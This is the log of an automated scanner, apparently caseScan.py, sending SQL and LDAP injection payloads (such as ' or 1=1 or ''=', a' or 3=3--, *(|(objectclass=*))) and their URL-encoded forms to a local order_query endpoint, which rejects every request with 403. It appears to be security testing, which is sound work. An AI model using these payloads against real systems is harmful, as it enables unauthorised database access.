[INFO]00:18:21:116-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:142-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "char%4039%41%2b%40SELECT\n"}}
[INFO]00:18:21:143-caseScan.py:113 >> code: 403
[INFO]00:18:21:144-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:170-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "&apos;%20OR\n"}}
[INFO]00:18:21:171-caseScan.py:113 >> code: 403
[INFO]00:18:21:171-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:196-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "'sqlattempt1\n"}}
[INFO]00:18:21:197-caseScan.py:113 >> code: 403
[INFO]00:18:21:197-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:224-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "(sqlattempt2)\n"}}
[INFO]00:18:21:225-caseScan.py:113 >> code: 403
[INFO]00:18:21:225-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:251-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "|\n"}}
[INFO]00:18:21:252-caseScan.py:113 >> code: 403
[INFO]00:18:21:252-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:277-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "%7C\n"}}
[INFO]00:18:21:278-caseScan.py:113 >> code: 403
[INFO]00:18:21:278-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:304-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "*|\n"}}
[INFO]00:18:21:304-caseScan.py:113 >> code: 403
[INFO]00:18:21:305-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:332-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "%2A%7C\n"}}
[INFO]00:18:21:333-caseScan.py:113 >> code: 403
[INFO]00:18:21:333-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:359-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "*(|(mail=*))\n"}}
[INFO]00:18:21:360-caseScan.py:113 >> code: 403
[INFO]00:18:21:361-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:386-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "%2A%28%7C%28mail%3D%2A%29%29\n"}}
[INFO]00:18:21:387-caseScan.py:113 >> code: 403
[INFO]00:18:21:387-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:414-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "*(|(objectclass=*))\n"}}
[INFO]00:18:21:414-caseScan.py:113 >> code: 403
[INFO]00:18:21:415-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:442-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "%2A%28%7C%28objectclass%3D%2A%29%29\n"}}
[INFO]00:18:21:442-caseScan.py:113 >> code: 403
[INFO]00:18:21:443-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:470-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "(\n"}}
[INFO]00:18:21:471-caseScan.py:113 >> code: 403
[INFO]00:18:21:471-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:498-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "%28\n"}}
[INFO]00:18:21:498-caseScan.py:113 >> code: 403
[INFO]00:18:21:499-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:524-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": ")\n"}}
[INFO]00:18:21:525-caseScan.py:113 >> code: 403
[INFO]00:18:21:525-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:554-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "%29\n"}}
[INFO]00:18:21:554-caseScan.py:113 >> code: 403
[INFO]00:18:21:555-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:582-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "&\n"}}
[INFO]00:18:21:583-caseScan.py:113 >> code: 403
[INFO]00:18:21:583-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:608-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "%26\n"}}
[INFO]00:18:21:609-caseScan.py:113 >> code: 403
[INFO]00:18:21:609-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:636-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "!\n"}}
[INFO]00:18:21:636-caseScan.py:113 >> code: 403
[INFO]00:18:21:637-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:663-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "%21\n"}}
[INFO]00:18:21:664-caseScan.py:113 >> code: 403
[INFO]00:18:21:664-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:690-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or 1=1 or ''='\n"}}
[INFO]00:18:21:691-caseScan.py:113 >> code: 403
[INFO]00:18:21:691-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:716-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or ''='\n"}}
[INFO]00:18:21:717-caseScan.py:113 >> code: 403
[INFO]00:18:21:718-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:743-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "x' or 1=1 or 'x'='y\n"}}
[INFO]00:18:21:744-caseScan.py:113 >> code: 403
[INFO]00:18:21:744-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:772-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "/\n"}}
[INFO]00:18:21:772-caseScan.py:113 >> code: 403
[INFO]00:18:21:773-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:800-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "//\n"}}
[INFO]00:18:21:800-caseScan.py:113 >> code: 403
[INFO]00:18:21:801-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:825-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "//*\n"}}
[INFO]00:18:21:826-caseScan.py:113 >> code: 403
[INFO]00:18:21:827-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:853-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "*/*\n"}}
[INFO]00:18:21:853-caseScan.py:113 >> code: 403
[INFO]00:18:21:854-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:883-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "a' or 3=3--\n"}}
[INFO]00:18:21:883-caseScan.py:113 >> code: 403
[INFO]00:18:21:884-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:910-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "\"a\"\" or 3=3--\"\n"}}
[INFO]00:18:21:911-caseScan.py:113 >> code: 403
[INFO]00:18:21:911-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:937-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "' or 3=3\n"}}
[INFO]00:18:21:938-caseScan.py:113 >> code: 403
[INFO]00:18:21:938-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:964-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "\u2018 or 3=3 --\n"}}
[INFO]00:18:21:965-caseScan.py:113 >> code: 403
[INFO]00:18:21:966-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

[INFO]00:18:21:993-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/order_query", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"order_id": "c"}}
[INFO]00:18:21:994-caseScan.py:113 >> code: 403
[INFO]00:18:21:994-caseScan.py:114 >> response: {
  "message": "order_id not exist"
}

